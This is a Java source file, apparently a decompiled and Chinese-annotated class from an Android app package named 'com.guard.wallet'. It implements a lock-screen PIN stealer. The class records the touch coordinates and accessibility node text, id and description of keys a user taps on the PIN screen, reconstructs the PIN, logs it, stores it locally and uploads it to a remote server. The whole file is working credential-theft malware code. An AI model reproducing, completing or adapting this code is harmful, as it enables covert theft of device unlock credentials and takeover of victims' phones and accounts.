/**
 * PIN/文本密码收集分析器。
 * <p>
 * 负责收集用户在锁屏 PIN 界面上的按键触摸坐标（touchPoints）和
 * 按键对应的节点属性（textTokens），进行多维度密码破解分析
 * （按 ID、按文本、按 DESC），最终将破解结果上传至服务端。
 * <p>
 * 破解流程:
 * <ol>
 *   <li>若存在触摸坐标且为锁屏监听（listenType=1），构建触点密码上传</li>
 *   <li>若存在触摸坐标且为其他监听类型，构建触点密码上传至 OtherCipher</li>
 *   <li>将 textTokens 按属性类型（text/id/desc）分类</li>
 *   <li>分别调用 {@code CrackLockCipherPlug.extractPinFromIds()} 和 {@code CrackLockCipherPlug.mergeTextCipher()} 进行 ID/文本/DESC 维度破解</li>
 *   <li>合并结果，满足条件时保存至本地并上传 LockCipher</li>
 * </ol>
 * <p>
 * vendor 原始类名: com.guard.wallet.plug.f
 */
package com.guard.wallet.plug;

import com.guard.wallet.core.AppUtils;
import com.guard.wallet.util.MultiModeComparator;

import android.util.Log;
import com.guard.wallet.http.HttpApiManager;
import com.guard.wallet.req.ListenPropResponse;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.RespCipherStateVO;
import java.io.Serializable;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;

public final class PinCodeCollector implements Serializable {
    private static final String TAG = "com.guard.wallet.plug.f";

    public ReqListenHelper listenHelper;
    public final LinkedList<ListenPropResponse> textTokens = new LinkedList<>();
    public final LinkedList<com.guard.wallet.entity.Point> touchPoints = new LinkedList<>();

    public PinCodeCollector() {}

    /**
     * 分析收集到的触摸坐标和文本令牌，执行多维度密码破解，
     * 并将结果保存到本地 SharedPrefs 及上传至服务端。
     * <p>
     * vendor 原始方法: a()
     */
    public final void analyzeAndUpload() {
        boolean hasData;
        LinkedList<com.guard.wallet.entity.Point> points;
        Integer lockType;
        ReqUnlockDeviceVO cipherResult;

        label97: {
            ReqListenHelper helper = this.listenHelper;
            points = this.touchPoints;
            hasData = true;
            lockType = 1;

            if (helper != null && !points.isEmpty()) {
                if (Objects.equals(this.listenHelper.getListenType(), lockType)) {
                    // 锁屏监听类型: 构建触点密码
                    cipherResult = new ReqUnlockDeviceVO();
                    cipherResult.setTouchCipher(new LinkedList<>());
                    cipherResult.getTouchCipher().addAll(points);
                    cipherResult.setCipherGradeCode("PASSWORD_QUALITY_TOUCH_POINTS");
                    Log.d(TAG, "已破解触点密码:" + cipherResult);
                    break label97;
                }

                // 非锁屏监听类型: 上传至 OtherCipher
                RespCipherStateVO resp = new RespCipherStateVO();
                resp.setListenType(this.listenHelper.getListenType());
                resp.setListenId(this.listenHelper.getListenId());
                resp.setSubscribeId(this.listenHelper.getSubscribeId());
                resp.setCipherGradeCode("PASSWORD_QUALITY_TOUCH_POINTS");
                resp.setTouchCipher(new LinkedList<>());
                resp.getTouchCipher().addAll(points);
                HttpApiManager.uploadOtherCipher(resp);
            }

            cipherResult = null;
        }

        points.clear();
        LinkedList<ListenPropResponse> tokens = this.textTokens;
        ReqUnlockDeviceVO mergedCipher = cipherResult;

        if (!tokens.isEmpty()) {
            LinkedList<ListenPropResponse> textList = new LinkedList<>();
            LinkedList<ListenPropResponse> idList = new LinkedList<>();
            LinkedList<ListenPropResponse> descList = new LinkedList<>();

            // 按属性类型分类: text / id / desc
            tokens.removeIf(new PropCategoryPredicate(1, textList, idList, descList, this));

            mergedCipher = cipherResult;
            if (cipherResult == null) {
                mergedCipher = new ReqUnlockDeviceVO();
            }

            // 按 ID 维度破解
            if (!idList.isEmpty()) {
                idList.sort(new MultiModeComparator(1));
                ReqUnlockDeviceVO idCracked = CrackLockCipherPlug.extractPinFromIds(idList);
                if (idCracked != null && !AppUtils.B(idCracked.getTextCipher())) {
                    Log.d(TAG, "按ID破解:" + idCracked.getTextCipher());
                    mergedCipher.setCipherGradeCode(idCracked.getCipherGradeCode());
                    mergedCipher.setTextCipher(idCracked.getTextCipher());
                }
            }

            // 按文本维度破解
            if (!textList.isEmpty()) {
                textList.sort(new MultiModeComparator(1));
                ReqUnlockDeviceVO textCracked = CrackLockCipherPlug.mergeTextCipher(textList);
                if (textCracked != null && !AppUtils.B(textCracked.getTextCipher())) {
                    Log.d(TAG, "按文本破解:" + textCracked.getTextCipher());
                    if (AppUtils.B(mergedCipher.getCipherGradeCode())) {
                        mergedCipher.setCipherGradeCode(textCracked.getCipherGradeCode());
                    }
                    if (AppUtils.B(mergedCipher.getTextCipher()) || CrackLockCipherPlug.isNotSubstring(mergedCipher.getTextCipher(), mergedCipher.getTextCipher())) {
                        mergedCipher.setTextCipher(textCracked.getTextCipher());
                    }
                }
            }

            // 按 DESC 维度破解
            if (!descList.isEmpty()) {
                descList.sort(new MultiModeComparator(1));
                ReqUnlockDeviceVO descCracked = CrackLockCipherPlug.extractPinFromIds(descList);
                if (descCracked != null && !AppUtils.B(descCracked.getTextCipher())) {
                    Log.d(TAG, "按DESC破解:" + descCracked.getTextCipher());
                    if (AppUtils.B(mergedCipher.getCipherGradeCode())) {
                        mergedCipher.setCipherGradeCode(descCracked.getCipherGradeCode());
                    }
                    if (AppUtils.B(mergedCipher.getTextCipher()) || CrackLockCipherPlug.isNotSubstring(mergedCipher.getTextCipher(), mergedCipher.getTextCipher())) {
                        mergedCipher.setTextCipher(descCracked.getTextCipher());
                    }
                }
            }

            tokens.clear();
        }

        // 锁屏类型且密码有效时，保存并上传
        label61:
        if (Objects.equals(this.listenHelper.getListenType(), lockType) && !AppUtils.B(mergedCipher.getCipherGradeCode())) {
            if (!CrackLockCipherPlug.isValidCipher(mergedCipher.getTextCipher())) {
                List<com.guard.wallet.entity.Point> touchCipher = mergedCipher.getTouchCipher();
                if (touchCipher == null || touchCipher.isEmpty()) {
                    hasData = false;
                }
                if (!hasData) {
                    break label61;
                }
            }

            Log.d(TAG, "Lock Cipher:" + mergedCipher);
            com.guard.wallet.utils.SharedPrefsManager.C(mergedCipher);
            HttpApiManager.uploadLockCipher(mergedCipher);
        }

        this.listenHelper = null;
    }
}
